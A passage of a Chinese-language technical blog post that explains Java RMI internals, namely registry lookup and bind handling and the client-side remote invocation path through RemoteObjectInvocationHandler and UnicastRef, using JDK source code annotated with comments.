&#123;             <span class="comment">// 保证“检查并返回”的一致性与可见性</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> bindings.get(name);  <span class="comment">// 根据名称查询已登记的远程对象</span></span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;                <span class="comment">// 未绑定：按规范抛出 NotBoundException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotBoundException</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;                       <span class="comment">// 命中：返回远程对象引用（通常为 stub）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>将查询到的远程对象序列化后写入输出流。</p>
</li>
</ol>
<p>对于服务端的 <code>bind</code> 调用代码逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// bind(String, Remote)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 0) 服务端本地策略校验：默认仅允许“本机进程”执行 bind/rebind/unbind</span></span><br><span class="line">    <span class="comment">//    （远程来电会在此抛出 AccessException）</span></span><br><span class="line">    RegistryImpl.checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line"></span><br><span class="line">    java.lang.String $param_String_1;   <span class="comment">// 要绑定的名称</span></span><br><span class="line">    java.rmi.Remote  $param_Remote_2;   <span class="comment">// 要绑定的远程对象（通常是其 stub）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 解组（读取）参数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> (ObjectInputStream) call.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.1 名称：用 SharedSecrets 的只读字符串 API，避免任意对象反序列化</span></span><br><span class="line">        $param_String_1 =</span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.2 远程对象：按对象读取（通常是可序列化的 stub）</span></span><br><span class="line">        $param_Remote_2 = (java.rmi.Remote) in.readObject();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// 解组失败：丢弃未处理完成的引用，抛出“解组异常”</span></span><br><span class="line">        call.discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 入参读取完毕，释放输入流（归还连接的一侧）</span></span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 调用注册中心实现：将 (name → remote) 放入绑定表</span></span><br><span class="line">    <span class="comment">//    - 可能抛出 AlreadyBoundException / AccessException / RemoteException：</span></span><br><span class="line">    <span class="comment">//      这些异常会沿栈抛出，由上层 dispatch 框架回写为“异常返回”。</span></span><br><span class="line">    server.bind($param_String_1, $param_Remote_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 3) 正常返回（void）：</span></span><br><span class="line">        <span class="comment">//    获取结果流（true = 正常返回），不写返回体，仅写协议头并收尾</span></span><br><span class="line">        call.getResultStream(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="comment">// 返回阶段的序列化/IO 出错 → 编组异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>从输入流反序列化得到远程对象及其名称。</p>
</li>
<li><p>调用 <code>RegistryImpl#bind</code> 方法将远程对象名称与远程对象作为键值对存入哈希表 <code>bindings</code> 中。 </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的名称绑定到远程对象（通常为其 stub），登记到当前注册表中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;语义：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若 &#123;<span class="doctag">@code</span> name&#125; 尚未绑定，则建立映射 &#123;<span class="doctag">@code</span> name → obj&#125;；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若 &#123;<span class="doctag">@code</span> name&#125; 已存在，则抛出 &#123;<span class="doctag">@link</span> AlreadyBoundException&#125;；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;本方法仅负责“登记”，并不负责导出 &#123;<span class="doctag">@code</span> obj&#125;。通常应先导出对象再绑定。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;访问控制：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对通过网络进入的调用，访问检查（如仅允许本机 bind/rebind/unbind）已在</span></span><br><span class="line"><span class="comment"> *       传输/骨架层完成；此处为本地实现逻辑，不再重复检查。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;并发与可见性：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对内部映射 &#123;<span class="doctag">@code</span> bindings&#125; 的读写受 &#123;<span class="doctag">@code</span> synchronized (bindings)&#125; 保护，</span></span><br><span class="line"><span class="comment"> *       保证“检查→插入”的原子性。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 要绑定的名称（应为非空）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  要绑定的远程对象（应实现 &#123;<span class="doctag">@link</span> java.rmi.Remote&#125;，通常是已导出的存根）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException       当经由远程调用此方法、网络/序列化出错时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AlreadyBoundException 名称已被绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AccessException       远程调用方无权执行绑定（由上层访问检查抛出）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 访问检查已在骨架/分发层完成；本地直接执行业务逻辑</span></span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="comment">// 1) 名称是否已存在</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2) 建立名称 → 远程对象 的映射（通常为 stub）</span></span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h3><p>服务调用即客户端调用远程对象的方法的过程，期间还会传递参数和返回值：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(hello.sayHello(<span class="string">&quot;sky123&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<h4 id="客户端部分"><a href="#客户端部分" class="headerlink" title="客户端部分"></a>客户端部分</h4><p>根据前面的分析我们知道，客户端从注册中心查询到的服务实际上是远程对象的存根（<code>Stub</code>，即远程对象的动态代理）。因此当我们在客户端调用远程对象的方法实际上会被代理类转发到 <code>InvocationHandler</code> 的 <code>invoke</code> 方法上。又因为根据前面对远程对象创建过程的分析可知，创建远程对象的代理类时使用的 <code>InvocationHandler</code> 实际上是 <code>RemoteObjectInvocationHandler</code>，对应的 <code>invoke</code> 方法如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 动态代理回调入口：对代理实例的方法调用都会转到这里。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;处理流程：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;合法性校验&lt;/b&gt;：确认 &#123;<span class="doctag">@code</span> proxy&#125; 确为 JDK 动态代理实例，且其</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@link</span> java.lang.reflect.Proxy#getInvocationHandler(Object) 调用处理器&#125;</span></span><br><span class="line"><span class="comment"> *       与当前对象一致，避免被“外来 handler”误用。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;Object 基础方法直通&lt;/b&gt;：对 &#123;<span class="doctag">@code</span> hashCode&#125;/&#123;<span class="doctag">@code</span> equals&#125;/&#123;<span class="doctag">@code</span> toString&#125;</span></span><br><span class="line"><span class="comment"> *       等来自 &#123;<span class="doctag">@link</span> Object&#125; 的方法，走本地实现（通常结合远程语义定制），</span></span><br><span class="line"><span class="comment"> *       避免发起远程调用。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;finalize 特殊处理&lt;/b&gt;：默认不允许通过代理触发 &#123;<span class="doctag">@code</span> finalize()&#125;，</span></span><br><span class="line"><span class="comment"> *       以规避意外的生命周期/安全问题；若打开 &#123;<span class="doctag">@code</span> allowFinalizeInvocation&#125; 则放行。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;远程方法调用&lt;/b&gt;：其余接口方法按 RMI/JRMP 协议编码后通过远程引用发送，</span></span><br><span class="line"><span class="comment"> *       并返回远端结果或抛出远端异常。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> proxy  触发调用的代理实例（必须是 &#123;<span class="doctag">@link</span> java.lang.reflect.Proxy&#125; 生成的对象）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method 被调用的方法对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args   方法参数（可能为 &#123;<span class="doctag">@code</span> null&#125; 或空数组）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 方法返回值；若方法为 &#123;<span class="doctag">@code</span> void&#125; 则返回 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Throwable 远端抛出的受检/非受检异常会在本地重新抛出；</span></span><br><span class="line"><span class="comment"> *                   参数非法时抛 &#123;<span class="doctag">@link</span> IllegalArgumentException&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="comment">// 1) 基本校验：确保 proxy 是动态代理对象</span></span><br><span class="line">    <span class="keyword">if</span> (!Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 1.1 进一步校验：该代理的 invocation handler 必须是“我自己”</span></span><br><span class="line">    <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 来自 Object 的方法（hashCode/equals/toString 等）走本地实现，避免远程开销</span></span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3) finalize 的保护性处理：默认忽略，防止经由代理链触发终结逻辑</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName())</span><br><span class="line">             &amp;&amp; method.getParameterCount() == <span class="number">0</span></span><br><span class="line">             &amp;&amp; !allowFinalizeInvocation) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 显式忽略 finalize()</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4) 其余方法按远程调用处理：编组参数 → 发送 → 解组返回/异常</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数的主要逻辑为：</p>
<ul>
<li>如果调用的是 <code>Object</code> 声明的方法（如 <code>getClass</code>，<code>hashCode</code>，<code>equals</code> 之类的），则接调用 <code>invokeObjectMethod</code> 方法进行处理。</li>
<li>若调用的是远程对象自己的方法，接调用 <code>invokeRemoteMethod</code> 函数执行远程方法调用。</li>
</ul>
<p><code>invokeRemoteMethod</code> 函数实际是委托 <code>RemoteRef</code> 的子类的 <code>UnicastRef#invoke</code> 方法来执行。这里 <code>UnicastRef#invoke</code> 传入的 <code>getMethodHash(method)</code> 参数是方法的哈希值，后面服务端会根据这个哈希值找到相应的方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理一次“远程方法调用”的客户端侧逻辑（用于 JDK 动态代理的 InvocationHandler）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;步骤概要：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;校验 &#123;<span class="doctag">@code</span> proxy&#125; 必须实现 &#123;<span class="doctag">@link</span> java.rmi.Remote&#125;；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;通过底层 &#123;<span class="doctag">@link</span> java.rmi.server.RemoteRef#invoke(Remote, Method, Object[], long)&#125;</span></span><br><span class="line"><span class="comment"> *       发起 JRMP 调用（方法由 1.2+ 的“方法哈希”标识）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对异常进行规范化：仅允许抛出&lt;b&gt;运行时异常&lt;/b&gt;或该方法&lt;b&gt;声明的受检异常&lt;/b&gt;；</span></span><br><span class="line"><span class="comment"> *       其他受检异常包装为 &#123;<span class="doctag">@link</span> java.rmi.UnexpectedException&#125; 再抛出。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> proxy  触发调用的代理实例（必须实现 &#123;<span class="doctag">@link</span> java.rmi.Remote&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method 被调用的方法（来自远程接口）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args   方法参数（可为 &#123;<span class="doctag">@code</span> null&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远端返回值；若方法为 &#123;<span class="doctag">@code</span> void&#125; 则返回 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 远端抛出的已声明异常、运行时异常，或被包装为 UnexpectedException 的未声明受检异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 基本校验：动态代理实例必须实现 Remote</span></span><br><span class="line">        <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 发起真正的远程调用：</span></span><br><span class="line">        <span class="comment">//    getMethodHash(method) 计算 JRMP 1.2+ 的 64 位方法哈希，用于协议层定位方法</span></span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args, getMethodHash(method));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastRef#invoke</code> 函数的逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发起一次远程方法调用：</span></span><br><span class="line"><span class="comment"> * - 由引用（RemoteRef）负责建连、参数编组、发送请求、接收并解组返回值/异常；</span></span><br><span class="line"><span class="comment"> * - 成功返回方法结果；失败时抛出 RemoteException 或（由服务端抛出的）应用层异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj    远程对象的代理（stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method 要调用的方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> params 方法实参</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> opnum  用于标识方法的 64 位“方法哈希”（JRMP 1.2+）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj, Method method, Object[] params, <span class="type">long</span> opnum)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;method: &quot;</span> + method);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        logClientCall(obj, method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 向通道申请一条连接（可能复用）</span></span><br><span class="line">    <span class="type">Connection</span>  <span class="variable">conn</span>  <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">    <span class="type">RemoteCall</span>  <span class="variable">call</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span>     <span class="variable">reuse</span> <span class="operator">=</span> <span class="literal">true</span>;      <span class="comment">// 默认：调用后连接可复用</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">alreadyFreed</span> <span class="operator">=</span> <span class="literal">false</span>;  <span class="comment">// 提前归还连接的标记，避免 finally 再次归还</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;opnum = &quot;</span> + opnum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 创建调用上下文（-1 表示使用“方法哈希”路径，而非 1.1 的正数 opnum）</span></span><br><span class="line">        call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 编组参数（写出调用头 + 自定义数据 + 各参数）</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            marshalCustomCallData(out);                 <span class="comment">// 可选的自定义调用数据</span></span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                marshalValue(types[i], params[i], out); <span class="comment">// 按参数类型编码（含原始类型）</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;IOException marshalling arguments: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 发送请求并等待返回（服务器执行完毕后可读取返回流）</span></span><br><span class="line">        call.executeCall();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">            <span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class) &#123;</span><br><span class="line">                <span class="comment">// void 返回：无返回体，但仍需要在 